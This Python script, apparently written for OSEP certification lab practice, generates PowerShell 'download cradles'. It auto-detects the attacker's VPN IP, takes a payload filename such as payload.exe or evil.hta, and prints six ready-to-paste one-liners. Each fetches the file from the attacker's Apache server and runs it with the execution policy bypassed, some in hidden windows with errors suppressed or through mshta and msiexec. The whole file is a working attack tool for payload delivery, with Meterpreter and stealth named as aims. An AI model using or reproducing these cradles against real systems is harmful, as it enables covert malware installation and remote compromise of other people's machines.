#!/usr/bin/env python3
"""
OSEP Cradle Generator v2 - Download + Execute Edition
Only outputs cradles that actually download the file to disk and run it.
Perfect for .exe, .hta, .msi, etc. on Apache (port 80).
"""

import subprocess
import os

def get_tun0_ip():
    """Auto-detect tun0 IP (OffSec lab VPN)"""
    try:
        result = subprocess.run(["ip", "-4", "addr", "show", "tun0"],
                                capture_output=True, text=True, timeout=3)
        for line in result.stdout.splitlines():
            if "inet " in line:
                return line.strip().split()[1].split("/")[0]
    except:
        pass
    print("[-] Could not auto-detect tun0.")
    return input("[?] Enter your tun0 IP manually: ").strip()

def main():
    print("=" * 70)
    print("     OSEP CRADLE GENERATOR v2 - DOWNLOAD + EXECUTE ONLY")
    print("=" * 70)
    
    ip = get_tun0_ip()
    print(f"\n[+] tun0 IP: \033[92m{ip}\033[0m")
    print(f"[+] Apache URL: \033[92mhttp://{ip}:80/\033[0m")
    
    filename = input("\n[?] Enter exact filename (e.g. payload.exe, evil.hta, setup.msi): ").strip()
    
    if not filename:
        print("[-] Filename required!")
        return
    
    url = f"http://{ip}:80/{filename}"
    temp_path = f"$env:TEMP\\{filename}"
    
    print(f"\n[+] Full URL: \033[96m{url}\033[0m")
    print("\nMake sure your file is in /var/www/html/ and Apache is running:")
    print("   sudo systemctl start apache2")
    print(f"   sudo cp {filename} /var/www/html/")
    print("=" * 70)

    cradles = [
        ("1. Standard Download + Execute (Most Reliable)",
         f'powershell -ep bypass -c "(New-Object Net.WebClient).DownloadFile(\'{url}\', \'{temp_path}\'); Start-Process \'{temp_path}\'"'),
        
        ("2. Hidden Window (Best for Meterpreter / Stealth)",
         f'powershell -ep bypass -c "(New-Object Net.WebClient).DownloadFile(\'{url}\', \'{temp_path}\'); Start-Process \'{temp_path}\' -WindowStyle Hidden"'),
        
        ("3. BitsTransfer + Hidden (Very Common in Writeups)",
         f'powershell -ep bypass -c "Start-BitsTransfer -Source \'{url}\' -Destination \'{temp_path}\'; Start-Process \'{temp_path}\' -WindowStyle Hidden"'),
        
        ("4. One-liner in TEMP folder (Clean & Robust)",
         f'powershell -ep bypass -c "cd $env:TEMP; (New-Object Net.WebClient).DownloadFile(\'{url}\', \'{filename}\'); .\\{filename}"'),
        
        ("5. DownloadFile + Execute with Error Suppression",
         f'powershell -ep bypass -c "(New-Object Net.WebClient).DownloadFile(\'{url}\', \'{temp_path}\'); Start-Process \'{temp_path}\' -WindowStyle Hidden -ErrorAction SilentlyContinue"'),
        
        ("6. HTA / MSI Specific (No Start-Process needed)",
         f'powershell -ep bypass -c "(New-Object Net.WebClient).DownloadFile(\'{url}\', \'{temp_path}\'); Start-Process mshta \'{temp_path}\'"' if filename.endswith('.hta') else
         f'powershell -ep bypass -c "(New-Object Net.WebClient).DownloadFile(\'{url}\', \'{temp_path}\'); msiexec /quiet /i \'{temp_path}\'"' if filename.endswith('.msi') else
         f'powershell -ep bypass -c "(New-Object Net.WebClient).DownloadFile(\'{url}\', \'{temp_path}\'); Start-Process \'{temp_path}\' -WindowStyle Hidden"')
    ]

    for name, cradle in cradles:
        print(f"\n\033[93m{name}\033[0m")
        print(f"   {cradle}")
        print("-" * 65)

    print("\n\033[92mAll cradles are ready to copy-paste!\033[0m")
    print("Just highlight the line you want and Ctrl+Shift+C")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Generator stopped.")
